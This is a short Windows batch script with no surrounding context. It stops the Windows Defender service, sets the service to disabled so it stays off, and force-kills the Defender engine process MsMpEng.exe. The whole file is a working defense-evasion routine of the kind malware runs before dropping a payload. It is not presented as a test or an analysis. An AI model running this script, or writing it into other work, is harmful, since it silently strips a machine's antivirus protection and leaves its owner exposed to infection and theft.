@echo off
sc stop "WinDefend"
sc config "WinDefend" start=disabled
taskkill /f /im MsMpEng.exe